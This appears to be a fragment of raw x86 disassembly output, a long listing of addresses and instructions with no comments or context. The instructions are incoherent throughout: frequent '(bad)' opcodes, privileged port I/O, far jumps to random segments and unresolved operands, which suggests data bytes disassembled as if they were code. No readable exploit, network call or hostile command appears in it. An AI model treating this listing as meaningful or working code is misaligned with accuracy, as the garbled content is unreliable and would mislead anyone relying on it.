  41a7bc:	jmp    edx
  41a7be:	mov    edx,0xc495dd77
  41a7c3:	push   0x6a
  41a7c5:	adc    al,BYTE PTR [ebp-0x6cd94938]
  41a7cb:	(bad)  
  41a7cc:	in     eax,dx
  41a7cd:	ja     0x41a7cb
  41a7cf:	dec    ebp
  41a7d0:	ins    BYTE PTR es:[edi],dx
  41a7d1:	loop   0x41a84b
  41a7d3:	test   DWORD PTR [ebx],esi
  41a7d5:	outs   dx,DWORD PTR ds:[esi]
  41a7d6:	test   BYTE PTR [edi+0x31],0x84
  41a7da:	imul   ebx,DWORD PTR [ecx+0x4d0b2457],0x51be979b
  41a7e4:	mov    ah,0x34
  41a7e6:	dec    edx
  41a7e7:	jmp    0x6579:0x2109a393
  41a7ee:	push   edx
  41a7ef:	xchg   BYTE PTR [edi],al
  41a7f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7f3:	xor    DWORD PTR [eax],ebp
  41a7f5:	push   edi
  41a7f6:	cmp    al,0x90
  41a7f8:	iret   
  41a7f9:	mov    ah,0x28
  41a7fb:	call   0x1abd:0x18099dbb
  41a802:	jmp    0xec7ad392
  41a807:	sub    bh,cl
  41a809:	sbb    DWORD PTR [ecx+0xa],eax
  41a80c:	scas   eax,DWORD PTR es:[edi]
  41a80d:	popa   
  41a80e:	or     DWORD PTR [edx-0xf8b3e28],ebx
  41a814:	in     al,0xe1
  41a816:	mov    esi,0xe638a6de
  41a81b:	stos   DWORD PTR es:[edi],eax
  41a81c:	mov    esi,eax
  41a81e:	mov    ?,ebp
  41a820:	jle    0x41a7d5
  41a822:	push   0xfffffffa
  41a824:	(bad)  
  41a825:	jne    0x41a81c
  41a827:	out    dx,al
  41a828:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a829:	gs dec ebp
  41a82b:	cmc    
  41a82c:	dec    eax
  41a82d:	push   edx
  41a82e:	(bad)  
  41a830:	mov    DWORD PTR [esi-0x3f],eax
  41a833:	or     eax,0x1db0e2ef
  41a838:	test   BYTE PTR [ecx],cl
  41a83a:	mov    edx,0x38164084
  41a83f:	popf   
  41a840:	add    ebx,DWORD PTR [edx+ebx*2-0x21]
  41a844:	fiadd  WORD PTR [eax-0x722e9601]
  41a84a:	out    dx,al
  41a84b:	lds    eax,FWORD PTR [esi-0x7]
  41a84e:	push   cs
  41a84f:	adc    DWORD PTR [ebx-0x4586221d],ecx
  41a855:	int3   
  41a856:	(bad)  
  41a857:	loope  0x41a832
  41a859:	retf   
  41a85a:	dec    ecx
  41a85b:	cdq    
  41a85c:	adc    DWORD PTR [ebx+0x6f],0x23
  41a860:	jb     0x41a85c
  41a862:	dec    eax
  41a863:	dec    esp
  41a864:	inc    eax
  41a865:	pop    ebx
  41a866:	scas   al,BYTE PTR es:[di]
  41a868:	ja     0x41a824
  41a86a:	mov    ecx,0xb24a159c
  41a86f:	cmp    dh,BYTE PTR [eax-0x7]
  41a872:	out    0xfa,al
  41a874:	nop
  41a875:	loop   0x41a827
  41a877:	es push es
  41a879:	mov    edi,0x828f9693
  41a87e:	mov    al,0x0
  41a880:	push   0x1a
  41a882:	scas   eax,DWORD PTR es:[edi]
  41a883:	out    dx,eax
  41a884:	jbe    0x41a84b
  41a886:	pop    es
  41a887:	int3   
  41a888:	or     ebp,ecx
  41a88a:	imul   edi,DWORD PTR [ecx],0xa67423bb
  41a890:	push   ebx
  41a891:	mov    ch,0x4b
  41a893:	lahf   
  41a894:	add    esi,ecx
  41a896:	mov    eax,0x858a2e6a
  41a89b:	sbb    al,bh
  41a89d:	mov    eax,ds:0x144ce843
  41a8a2:	sbb    edx,DWORD PTR [ebp+0x54e52c3b]
  41a8a8:	out    dx,eax
  41a8a9:	ins    BYTE PTR es:[edi],dx
  41a8aa:	xor    eax,0xad0c3c7
  41a8af:	jno    0x41a876
  41a8b1:	mov    cl,0x53
  41a8b3:	lahf   
  41a8b4:	push   ds
  41a8b5:	int3   
  41a8b6:	pop    ecx
  41a8b7:	(bad)  
  41a8b8:	(bad)  
  41a8ba:	fadd   DWORD PTR [edx]
  41a8bc:	fcmovb st,st(6)
  41a8be:	pop    eax
  41a8bf:	mov    al,ds:0x9cacac69
  41a8c4:	cmp    al,BYTE PTR [esi-0xf8da5c6]
  41a8ca:	into   
  41a8cb:	pop    edx
  41a8cc:	push   cs
  41a8cd:	mov    esp,0xbfed4e30
  41a8d2:	xchg   ebp,eax
  41a8d3:	dec    ebp
  41a8d4:	stos   BYTE PTR es:[edi],al
  41a8d5:	xor    edx,DWORD PTR [edi+0x53]
  41a8d8:	push   esi
  41a8d9:	ins    DWORD PTR es:[edi],dx
  41a8da:	sbb    BYTE PTR [edx-0x7619f926],cl
  41a8e0:	cdq    
  41a8e1:	add    al,0x5d
  41a8e3:	jle    0x41a8aa
  41a8e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8e7:	push   ebp
  41a8e8:	loopne 0x41a915
  41a8ea:	or     eax,0x37b02c67
  41a8ef:	push   eax
  41a8f0:	mov    eax,ds:0xd5aaede7
  41a8f5:	scas   al,BYTE PTR es:[edi]
  41a8f6:	jns    0x41a8c6
  41a8f8:	sbb    esp,0x6d
  41a8fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8fc:	test   al,0xee
  41a8fe:	jmp    0x499ae698
  41a903:	xor    DWORD PTR [eax-0x2735b233],eax
  41a909:	cmp    ecx,DWORD PTR [ecx]
  41a90b:	icebp  
  41a90c:	das    
  41a90d:	sub    cl,dl
  41a90f:	mov    dh,0xfe
  41a911:	mov    ds:0x3fb1fd26,al
  41a916:	push   ss
  41a917:	push   0x7d
  41a919:	ja     0x41a902
  41a91b:	pop    esp
  41a91c:	ret    
  41a91d:	xchg   esp,eax
  41a91e:	pop    edi
  41a91f:	popf   
  41a920:	jmp    0x6d2:0xa5903b8d
  41a927:	cmc    
  41a928:	cli    
  41a929:	cld    
  41a92a:	and    ebx,DWORD PTR ds:0x1a1ba5b1
  41a930:	addr16 pop ds
  41a932:	je     0x41a9a3
  41a934:	in     eax,dx
  41a935:	xchg   DWORD PTR [eax+0x3d3a85ac],edi
  41a93b:	jp     0x41a8e4
  41a93d:	mov    bh,0x67
  41a93f:	mov    edi,0xc3085790
  41a944:	mov    dl,0x2f
  41a946:	shr    DWORD PTR [esp+edi*1-0x13],cl
  41a94a:	es gs repnz xchg ebx,eax
  41a94e:	push   eax
  41a94f:	mov    eax,ds:0x29bee97f
  41a954:	je     0x41a8e9
  41a956:	lahf   
  41a957:	jnp    0x41a990
  41a959:	cmp    al,0x4a
  41a95b:	dec    ebx
  41a95c:	fldln2 
  41a95e:	imul   BYTE PTR [ebx+0x7]
  41a961:	xor    DWORD PTR [ebx+0x63],ebx
  41a964:	je     0x41a9dc
  41a966:	aad    0x4a
  41a968:	adc    BYTE PTR [edx+0x33],0x70
  41a96c:	es or  bx,ax
  41a970:	pop    ecx
  41a971:	js     0x41a91f
  41a973:	add    DWORD PTR [ecx-0x10e0256e],0xc9b6ff04
  41a97d:	sti    
  41a97e:	sub    DWORD PTR [eax+0x3fffe909],eax
  41a984:	retf   0x9e2d
  41a987:	mov    ebp,ebx
  41a989:	rcr    BYTE PTR [ecx+0x20a21913],cl
  41a98f:	xor    al,0xc1
  41a991:	add    DWORD PTR [esi-0x14],edx
  41a994:	imul   edi,DWORD PTR [edx-0x1b5fa502],0x202ea383
  41a99e:	jge    0x41a9f4
  41a9a0:	shl    BYTE PTR [edi+0x5d],1
  41a9a3:	sbb    al,0xf3
  41a9a5:	test   DWORD PTR [edi+edx*4-0x420d60f3],edx
  41a9ac:	out    dx,al
  41a9ad:	popf   
  41a9ae:	cmp    al,0xf0
  41a9b0:	in     eax,dx
  41a9b1:	out    dx,eax
  41a9b2:	xchg   ebx,eax
  41a9b3:	mov    bl,0x36
  41a9b5:	cs stos DWORD PTR es:[edi],eax
  41a9b7:	stos   BYTE PTR es:[edi],al
  41a9b8:	push   ebp
  41a9b9:	add    edi,eax
  41a9bb:	inc    edx
  41a9bc:	fiadd  DWORD PTR [ebx+0x377acc0f]
  41a9c2:	mov    cl,0x9a
  41a9c4:	mov    ds:0x5d02f581,eax
  41a9c9:	aas    
  41a9ca:	pinsrw mm4,WORD PTR [edx-0x6480f1f],0x2c
  41a9d2:	or     BYTE PTR [ecx],ah
  41a9d4:	mov    ah,0x1e
  41a9d6:	es (bad) 
  41a9d8:	loope  0x41a961
  41a9da:	out    dx,al
  41a9db:	repnz pop es
  41a9dd:	ds outs dx,BYTE PTR cs:[esi]
  41a9e0:	xlat   BYTE PTR ds:[ebx]
  41a9e1:	cdq    
  41a9e2:	popf   
  41a9e3:	cmp    al,ah
  41a9e5:	cmp    al,BYTE PTR [edx*2+0x78a67cb7]
  41a9ec:	scas   al,BYTE PTR es:[edi]
  41a9ed:	out    dx,eax
  41a9ee:	push   edx
  41a9ef:	adc    DWORD PTR [eax+esi*1-0x79098e93],0xb3c69d60
  41a9fa:	jns    0x41a9e9
  41a9fc:	fld    TBYTE PTR [esi+0x5b]
  41a9ff:	bound  ecx,QWORD PTR [ebx-0x24]
  41aa02:	outs   dx,BYTE PTR ds:[esi]
  41aa03:	into   
  41aa04:	adc    eax,0x8719a2a5
  41aa09:	sub    al,0x1a
  41aa0b:	imul   edx,edx,0xffffffae
  41aa0e:	das    
  41aa0f:	dec    eax
  41aa10:	mov    esp,0xcf23bd09
  41aa15:	add    DWORD PTR [edx+0x24],esi
  41aa18:	xchg   ebx,eax
  41aa19:	mov    edx,0x3d96c6b9
  41aa1e:	inc    esp
  41aa1f:	sbb    esi,DWORD PTR [ecx+ecx*1-0x49]
  41aa23:	xchg   esp,eax
  41aa24:	jmp    0x4bdc:0xd183c61
  41aa2b:	mov    dl,0xab
  41aa2d:	xchg   ecx,eax
  41aa2e:	mov    ds,WORD PTR [ebx-0x71]
  41aa31:	push   ecx
  41aa32:	mov    ?,WORD PTR [esi+0x24434bae]
  41aa38:	(bad)  
  41aa39:	loope  0x41aa06
  41aa3b:	lahf   
  41aa3c:	xor    esp,DWORD PTR [ebp+0x1a]
  41aa3f:	xchg   esp,eax
  41aa40:	rol    BYTE PTR [esi+0x6],cl
  41aa43:	stos   DWORD PTR es:[edi],eax
  41aa44:	loop   0x41a9ed
  41aa46:	adc    BYTE PTR [esi-0x8ce8b8b],bh
  41aa4c:	test   al,0x2d
  41aa4e:	rcr    DWORD PTR [ecx],1
  41aa50:	pop    ebp
  41aa51:	sahf   
  41aa52:	adc    al,0x47
  41aa54:	dec    ebp
  41aa55:	sbb    dl,BYTE PTR [esi+0x5d]
  41aa58:	iret   
  41aa59:	(bad)  
  41aa5a:	in     al,0xd0
  41aa5c:	mov    ch,BYTE PTR [edx]
  41aa5e:	xchg   esp,eax
  41aa5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa60:	lods   eax,DWORD PTR ds:[esi]
  41aa61:	xor    ebx,DWORD PTR [eax]
  41aa63:	sbb    esi,esi
  41aa65:	je     0x41aa21
  41aa67:	xchg   edx,eax
  41aa68:	inc    edi
  41aa69:	inc    ecx
  41aa6a:	call   0xc24:0x21e331d4
  41aa71:	int3   
  41aa72:	xlat   BYTE PTR ds:[ebx]
  41aa73:	add    bl,BYTE PTR [esi-0x5f]
  41aa76:	leave  
  41aa77:	pop    esp
  41aa78:	adc    al,0xb3
  41aa7a:	fcom   DWORD PTR [eax]
  41aa7c:	in     al,0xe5
  41aa7e:	xlat   BYTE PTR ds:[ebx]
  41aa7f:	ins    BYTE PTR es:[edi],dx
  41aa80:	jecxz  0x41aa78
  41aa82:	cmp    dl,BYTE PTR [edx+0x2a]
  41aa85:	xchg   esp,eax
  41aa86:	adc    eax,0x6eccd8df
  41aa8b:	cli    
  41aa8c:	inc    ebp
  41aa8d:	push   ds
  41aa8e:	and    al,0x55
  41aa90:	(bad)
  41aa93:	sub    al,0x62
  41aa95:	fcomp  st(3)
  41aa97:	mov    ecx,0xb18e25ca
  41aa9c:	call   0xba:0x7d4a4ccf
  41aaa3:	js     0x41aa82
  41aaa5:	neg    esi
  41aaa7:	inc    edx
  41aaa8:	call   0x6944bf62
  41aaad:	shr    BYTE PTR [edi-0x18e22275],cl
  41aab3:	ins    DWORD PTR es:[edi],dx
  41aab4:	dec    ebx
  41aab5:	test   BYTE PTR [ebx+0x771e2776],ah
  41aabb:	sub    esp,esi
  41aabd:	or     al,0xc7
  41aabf:	xor    eax,0x70a84bbd
  41aac4:	fcmove st,st(6)
  41aac6:	jge    0x41aabd
  41aac8:	jmp    0x41aa81
  41aaca:	fmul   DWORD PTR [edx+eiz*2]
  41aacd:	sbb    ebx,edi
  41aacf:	ret    0x8
  41aad2:	idiv   edi
  41aad4:	lea    edx,[eax+0x32]
  41aad7:	addr16 (bad) 
  41aad9:	dec    esi
  41aada:	out    dx,al
  41aadb:	aam    0x2e
  41aadd:	(bad)  
  41aade:	mov    ch,0xfc
  41aae0:	mov    esi,esp
  41aae2:	jns    0x41ab43
  41aae4:	pusha  
  41aae5:	lock (bad) 
  41aae7:	loop   0x41aab4
  41aae9:	and    eax,0xde0759b6
  41aaee:	daa    
  41aaef:	and    ebp,0xffffffed
  41aaf2:	jmp    0x44e2:0x75484699
  41aaf9:	inc    ecx
  41aafa:	add    BYTE PTR [edi+eiz*1-0xcc14061],bh
  41ab01:	stos   BYTE PTR es:[edi],al
  41ab02:	add    eax,DWORD PTR [ebx]
  41ab04:	pop    ecx
  41ab05:	or     ebp,DWORD PTR [ebx-0x4d]
  41ab08:	xchg   ebx,eax
  41ab09:	fwait
  41ab0a:	adc    esp,DWORD PTR ds:0xb53b870b
  41ab10:	int    0x20
  41ab12:	or     DWORD PTR [eax+0x54481bdc],esi
  41ab18:	xchg   DWORD PTR [ecx],edi
  41ab1a:	xchg   ebx,eax
  41ab1b:	adc    BYTE PTR [ebx-0x60],ch
  41ab1e:	out    dx,al
  41ab1f:	mov    edi,0x6ed6090e
  41ab24:	inc    ebp
  41ab25:	xor    DWORD PTR [edi-0x23c1803b],ebp
  41ab2b:	jp     0x41ab10
  41ab2d:	fadd   DWORD PTR [eax-0x61]
  41ab30:	loopne 0x41abb1
  41ab32:	call   DWORD PTR [esp+eax*1+0x11]
  41ab36:	nop
  41ab37:	push   esp
  41ab38:	or     bl,BYTE PTR [edi-0x62]
  41ab3b:	adc    eax,0x89774cb0
  41ab40:	stos   DWORD PTR es:[edi],eax
  41ab41:	out    dx,al
  41ab42:	arpl   cx,si
  41ab44:	mov    bh,0xb2
  41ab46:	fwait
  41ab47:	mov    esi,0x788dbee
  41ab4c:	test   eax,0x13bf37cc
  41ab51:	or     ah,BYTE PTR [ecx]
  41ab53:	pushf  
  41ab54:	fisttp DWORD PTR [ebp+0x5e174ef2]
  41ab5a:	ror    al,0xc4
  41ab5d:	repz sub DWORD PTR [esi-0x1e8ebda6],ebp
  41ab64:	xchg   edx,eax
  41ab65:	mov    esp,0xe43221fa
  41ab6a:	fsubp  st(0),st
  41ab6c:	xchg   DWORD PTR [ebx],ecx
  41ab6e:	xor    BYTE PTR [edx+edi*2],bh
  41ab71:	jecxz  0x41ab46
  41ab73:	out    dx,eax
  41ab74:	mov    bh,0x71
  41ab76:	shr    DWORD PTR [ebx],0xc9
  41ab79:	mov    edi,0xf9f89f4c
  41ab7e:	mov    dh,BYTE PTR [ebp+0x4c0b5bcc]
  41ab84:	xchg   edx,eax
  41ab85:	ret    
  41ab86:	adc    al,0x43
  41ab88:	or     al,0x7c
  41ab8a:	test   eax,0x149b769f
  41ab8f:	xchg   ebp,eax
  41ab90:	pop    ebp
  41ab91:	out    0x19,al
  41ab93:	jne    0x41ac14
  41ab95:	(bad)  
  41ab96:	loopne 0x41ab9d
  41ab98:	push   esp
  41ab99:	inc    eax
  41ab9a:	dec    esp
  41ab9b:	and    DWORD PTR [edi],esp
  41ab9d:	test   DWORD PTR ds:[esi+0x5d],ebx
  41aba1:	jbe    0x41ab23
  41aba3:	xchg   edi,eax
  41aba4:	and    al,0x93
  41aba6:	int    0x8b
  41aba8:	dec    ax
  41abaa:	xchg   ah,dl
  41abac:	mov    ds:0x9c15729b,al
  41abb1:	inc    edx
  41abb2:	mov    gs,eax
  41abb4:	ret    
  41abb5:	dec    edx
  41abb6:	popf   
  41abb7:	nop
  41abb8:	(bad)  
  41abb9:	push   esi
  41abba:	fs or  al,0x47
  41abbd:	popw   ds
  41abbf:	push   ecx
  41abc0:	pusha  
  41abc1:	adc    ah,BYTE PTR [ebx]
  41abc3:	in     eax,dx
  41abc4:	or     DWORD PTR [ecx],ebx
  41abc6:	mov    ds:0x5a687d6e,eax
  41abcb:	inc    edi
  41abcc:	jmp    0xb55f:0x4597ca12
  41abd3:	dec    eax
  41abd4:	or     eax,DWORD PTR [ebp-0x7116163a]
  41abda:	fwait
  41abdb:	inc    edi
  41abdc:	aaa    
  41abdd:	mov    bl,0xb8
  41abdf:	sub    DWORD PTR [eax-0x595d225e],ebx
  41abe5:	and    al,0x1
  41abe7:	jmp    0x41ac11
  41abe9:	sar    ecx,cl
  41abeb:	fisubr DWORD PTR [ebx+ebx*8-0x72]
  41abef:	mov    esi,DWORD PTR [edx-0x28]
  41abf2:	cmp    ecx,DWORD PTR [edx]
  41abf4:	or     al,0xd1
  41abf6:	mov    ds:0xc6312346,eax
  41abfb:	push   ss
  41abfc:	xchg   ecx,eax
  41abfd:	cmp    ebp,DWORD PTR [eax+0x2cc652c0]
  41ac03:	add    ecx,DWORD PTR [ebx+0x44]
  41ac06:	sbb    al,dl
  41ac08:	pop    esi
  41ac09:	loopne 0x41ac2a
  41ac0b:	arpl   cx,sp
  41ac0d:	out    dx,eax
  41ac0e:	idiv   BYTE PTR [eax+ebx*1]
  41ac11:	out    0x24,al
  41ac13:	and    edx,edx
  41ac15:	sub    ecx,0x24
  41ac18:	jno    0x41ac18
  41ac1a:	loop   0x41aba8
  41ac1c:	iret   
  41ac1d:	test   DWORD PTR [esi+0x76],ebx
  41ac20:	je     0x41ac86
  41ac22:	pushf  
  41ac23:	add    edx,DWORD PTR [ebx]
  41ac25:	and    bl,BYTE PTR [esi-0xd]
  41ac28:	sbb    al,0x37
  41ac2a:	pop    ebp
  41ac2b:	arpl   WORD PTR [eax+0x35a9e694],cx
  41ac31:	or     BYTE PTR [esp+edi*1-0x4a8e37f7],0x97
  41ac39:	jp     0x41ac92
  41ac3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac3c:	rol    DWORD PTR [eax],0x0
  41ac3f:	add    BYTE PTR [eax],al
  41ac41:	add    BYTE PTR [ebp+0x4d],cl
  41ac44:	ss retf 0xfb36
  41ac48:	std    
  41ac49:	iret   
  41ac4a:	cmp    esp,DWORD PTR [edx]
  41ac4c:	(bad)  
  41ac4d:	cld    
  41ac4e:	call   0x9ca1f83a
  41ac53:	sub    BYTE PTR [ecx],al
  41ac55:	add    bl,dh
  41ac57:	add    al,0x0
  41ac59:	add    dl,bl
  41ac5b:	or     dh,BYTE PTR [edi+0x3e]
  41ac5e:	or     ah,dl
  41ac60:	pop    eax
  41ac61:	mov    esi,0xf8d893ae
  41ac66:	retw   0xf1de
  41ac6a:	push   ds
  41ac6b:	mov    dh,0x8
  41ac6d:	jle    0x41ac9b
  41ac6f:	jno    0x41ac3b
  41ac71:	test   al,0xa1
  41ac73:	cwde   
  41ac74:	sub    ch,BYTE PTR [ebx+0x59]
  41ac77:	out    dx,eax
  41ac78:	es pop ebx
  41ac7a:	pop    ecx
  41ac7b:	fisubr DWORD PTR [eax+0x13]
  41ac7e:	pusha  
  41ac7f:	stos   DWORD PTR es:[edi],eax
  41ac80:	xor    al,0x31
  41ac82:	rol    al,1
  41ac84:	div    al
  41ac86:	stos   DWORD PTR es:[edi],eax
  41ac87:	ffreep st(2)
  41ac89:	push   0xffffffde
  41ac8b:	iret   
  41ac8c:	adc    DWORD PTR ds:0xb4583347,edx
  41ac92:	mov    ebx,0xdb8cccf1
  41ac97:	stos   BYTE PTR es:[edi],al
  41ac98:	imul   esi,DWORD PTR [ebx],0x8b9e6eee
  41ac9e:	out    0xe,eax
  41aca0:	adc    DWORD PTR [edx-0x6a],esi
  41aca3:	test   eax,0x78ceb272
  41aca8:	stos   DWORD PTR es:[edi],eax
  41aca9:	add    bh,bl
  41acab:	loope  0x41acf1
  41acad:	jp     0x41acb8
  41acaf:	(bad)  
  41acb0:	repz pop esp
  41acb2:	test   DWORD PTR ss:[edx+ebx*1-0x55],ebp
  41acb7:	xchg   ebp,eax
  41acb8:	push   ebp
  41acb9:	xor    eax,0x526d057
  41acbe:	inc    edx
  41acbf:	out    0x94,eax
  41acc1:	add    esi,DWORD PTR [ebx]
  41acc3:	fdiv   QWORD PTR [edi+0x341033f3]
  41acc9:	dec    esi
  41acca:	and    eax,0x1fbd71da
  41accf:	test   al,0x16
  41acd1:	mov    ch,0xcb
  41acd3:	push   ss
  41acd4:	jmp    0x41acba
  41acd6:	and    eax,0x60015585
  41acdb:	inc    esi
  41acdc:	mov    ebx,0xd9519815
  41ace1:	lods   eax,DWORD PTR ds:[esi]
  41ace3:	dec    esp
  41ace4:	sub    edi,DWORD PTR [ebp+0x2c]
  41ace7:	aam    0xb
  41ace9:	pop    ds
  41acea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aceb:	dec    edx
  41acec:	mov    dl,0x71
  41acee:	jno    0x41ad49
  41acf0:	or     al,0xa3
  41acf2:	xchg   esp,eax
  41acf3:	pushf  
  41acf4:	mov    dl,0x0
  41acf6:	lods   eax,DWORD PTR ds:[esi]
  41acf7:	shl    BYTE PTR [ebx],0xde
  41acfa:	jmp    0xed3be5ee
  41acff:	mov    bh,0xe7
  41ad01:	or     eax,DWORD PTR [ebx-0x6c]
  41ad04:	mov    edx,0x23d454dd
  41ad09:	aad    0x44
  41ad0b:	into   
  41ad0c:	daa    
  41ad0d:	clc    
  41ad0e:	nop
  41ad0f:	repz sahf 
  41ad11:	add    al,0x6d
  41ad13:	lods   eax,DWORD PTR ds:[esi]
  41ad14:	jnp    0x41ad1a
  41ad16:	jne    0x41ad52
  41ad18:	nop
  41ad19:	jno    0x41accc
  41ad1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad1c:	cmp    cl,bh
  41ad1e:	test   DWORD PTR [edi+ecx*2+0x76],edi
  41ad22:	jbe    0x41ad02
  41ad24:	dec    esi
  41ad25:	or     ch,dl
  41ad27:	mov    esp,0xb4c36621
  41ad2c:	sub    dl,cl
  41ad2e:	loope  0x41acfd
  41ad30:	xchg   edx,eax
  41ad31:	in     al,0xc1
  41ad33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad34:	push   0xb66fbdc4
  41ad39:	jb     0x41ad5f
  41ad3b:	dec    ecx
  41ad3c:	add    eax,DWORD PTR [esi*2-0x7b496989]
  41ad43:	mov    cl,0x7a
  41ad45:	(bad)  
  41ad46:	xchg   esp,eax
  41ad47:	xchg   edi,eax
  41ad48:	mov    edx,esi
  41ad4a:	add    edx,DWORD PTR [esi]
  41ad4c:	enter  0xff86,0x90
  41ad50:	test   al,0x42
  41ad52:	(bad)  
  41ad53:	cdq    
  41ad54:	outs   dx,BYTE PTR ds:[esi]
  41ad55:	mov    ?,WORD PTR gs:0x72a32745
  41ad5c:	mov    ds:0xfb2f9fe9,eax
  41ad61:	in     al,0x63
  41ad63:	sbb    bh,BYTE PTR [ebp-0x66]
  41ad66:	mov    eax,0x3aa03a91
  41ad6b:	sbb    eax,0x593b8379
  41ad70:	out    dx,al
  41ad71:	dec    edx
  41ad72:	lods   eax,DWORD PTR ds:[esi]
  41ad73:	mov    ax,0x99f1
  41ad77:	sbb    eax,0x580c3cff
  41ad7c:	cmp    eax,DWORD PTR [edi-0xb02d981]
  41ad82:	in     al,dx
  41ad83:	jle    0x41ad83
  41ad85:	out    dx,al
  41ad86:	fs loop 0x41ad20
  41ad89:	xor    BYTE PTR [eax+0x75ff39cb],bh
  41ad8f:	sub    DWORD PTR [ecx+0x44],edx
  41ad92:	popa   
  41ad93:	xchg   eax,esi
  41ad95:	inc    eax
  41ad96:	loop   0x41ad51
  41ad98:	jae    0x41ad41
  41ad9a:	mov    cl,0x8a
  41ad9c:	jp     0x41ad71
  41ad9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad9f:	adc    al,bh
  41ada1:	jg     0x41ad58
  41ada3:	xor    DWORD PTR es:0xc9ff6b6f,esp
  41adaa:	and    edi,eax
  41adac:	push   es
  41adad:	std    
  41adae:	push   ebp
  41adaf:	mov    ah,0xea
  41adb1:	xchg   edx,eax
  41adb2:	fmul   QWORD PTR [ecx-0x56e85055]
  41adb8:	retf   
  41adb9:	mov    al,BYTE PTR [eax-0x6f708093]
  41adbf:	je     0x41ae2f
  41adc1:	mov    ebx,0x7df8d991
  41adc6:	and    dh,cl
  41adc8:	retf   0xa38b
  41adcb:	sub    esp,DWORD PTR [ebx+edi*2-0x171d6515]
  41add2:	cs mov ss,esp
  41add5:	fsub   DWORD PTR [ecx+0x4be6ffa8]
  41addb:	sbb    ebp,DWORD PTR [edx-0x52]
  41adde:	mov    ebp,0x8a10aad7
  41ade3:	mov    es,WORD PTR [edx-0x24]
  41ade6:	xor    esi,esi
  41ade8:	and    eax,esi
  41adea:	shl    BYTE PTR [edx+eax*4+0x47],0x2a
  41adef:	stos   BYTE PTR es:[edi],al
  41adf0:	mov    esp,0x71edd688
  41adf5:	sar    DWORD PTR [edi],0x9f
  41adf8:	or     eax,0x528a014a
  41adfd:	fmul   QWORD PTR [edx+0x3a]
  41ae00:	adc    edi,DWORD PTR [edx]
  41ae02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae03:	shr    DWORD PTR [edx],cl
  41ae05:	and    esp,DWORD PTR ds:[ecx-0x2f]
  41ae09:	adc    BYTE PTR [edi+0x3d],cl
  41ae0c:	ret    
  41ae0d:	clc    
  41ae0e:	repz xor al,0x90
  41ae11:	fst    QWORD PTR [ebp-0x47]
  41ae14:	xchg   esi,eax
  41ae15:	test   eax,0x7c8298f6
  41ae1a:	shl    BYTE PTR [ecx+0x5b],cl
  41ae1d:	mov    ds:0xa671c8cf,al
  41ae22:	sbb    BYTE PTR [edx],bh
  41ae24:	in     al,dx
  41ae25:	sub    eax,0xdf397bac
  41ae2a:	fwait
  41ae2b:	je     0x41ae07
  41ae2d:	idiv   BYTE PTR [esi-0x440de6a3]
  41ae33:	test   DWORD PTR [ebx+0x5a3fc96],esp
  41ae39:	dec    ebx
  41ae3a:	lahf   
  41ae3b:	cdq    
  41ae3c:	add    esp,eax
  41ae3e:	ss (bad) 
  41ae41:	nop
  41ae42:	(bad)  
  41ae43:	jo     0x41aeb6
  41ae45:	in     eax,0x6b
  41ae47:	mov    esp,0x733fcf00
  41ae4c:	add    BYTE PTR [edi],ch
  41ae4e:	jbe    0x41add6
  41ae50:	mov    esi,0x570fc3f2
  41ae55:	out    0x86,al
  41ae57:	cmc    
  41ae58:	shl    BYTE PTR [ecx-0x1f],1
  41ae5b:	sub    eax,0x1a044350
  41ae60:	jnp    0x41ae33
  41ae62:	(bad)  
  41ae64:	fild   DWORD PTR [ecx+eiz*2]
  41ae67:	or     DWORD PTR [edi],ebp
  41ae69:	add    cl,0x19
  41ae6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae6d:	bound  edi,QWORD PTR [ecx+0xe]
  41ae70:	test   DWORD PTR [edx+0x2a],ebx
  41ae73:	ficomp WORD PTR [edx+0x7b270c6e]
  41ae79:	push   0xffffffbd
  41ae7b:	push   esp
  41ae7c:	or     al,0x10
  41ae7e:	cmc    
  41ae7f:	inc    esp
  41ae80:	and    DWORD PTR [ecx+0x3b513c96],ebp
  41ae86:	mov    ds:0xf0edb14f,al
  41ae8b:	jl     0x41aede
  41ae8d:	imul   esi,DWORD PTR [ebx],0x76
  41ae90:	mov    ?,ecx
  41ae92:	jnp    0x41aef2
  41ae94:	dec    ebx
  41ae95:	mov    ah,0x8c
  41ae97:	pop    ss
  41ae98:	inc    esp
  41ae99:	dec    edi
  41ae9a:	push   cs
  41ae9b:	sti    
  41ae9c:	ffreep st(3)
  41ae9e:	or     esi,DWORD PTR [esi-0x56]
  41aea1:	or     al,bh
  41aea3:	retf   0x4f6e
  41aea6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aea7:	mov    eax,0xb1cba8b
  41aeac:	xchg   esp,eax
  41aead:	mov    WORD PTR [edx-0x1d],ds
  41aeb0:	mov    ds:0x35fe5b0f,eax
  41aeb5:	mul    BYTE PTR [edi]
  41aeb7:	call   0x5be:0x97f91d4d
  41aebe:	adc    DWORD PTR [esi+0x4296dd39],ecx
  41aec4:	sti    
  41aec5:	iret   
  41aec6:	in     eax,0xfa
  41aec8:	adc    BYTE PTR [ebx+0x4f],bh
  41aecb:	inc    ebx
  41aecc:	inc    ebp
  41aecd:	and    al,0x36
  41aecf:	xchg   ebp,eax
  41aed0:	xchg   DWORD PTR [esi+0x4e],edi
  41aed3:	mov    esp,0xaeb96c13
  41aed8:	push   es
  41aed9:	imul   ebx,DWORD PTR [eax+0x1a7e4828],0xa806311e
  41aee3:	mov    ebx,0x47784233
  41aee8:	outs   dx,BYTE PTR ds:[esi]
  41aee9:	cdq    
  41aeea:	mov    dh,0x66
  41aeec:	stc    
  41aeed:	cmp    DWORD PTR [eax],edx
  41aeef:	out    0x68,eax
  41aef1:	xor    ebp,DWORD PTR [esi+0x16779ca1]
  41aef7:	sub    edx,esp
  41aef9:	lea    edx,[eax+0x3f]
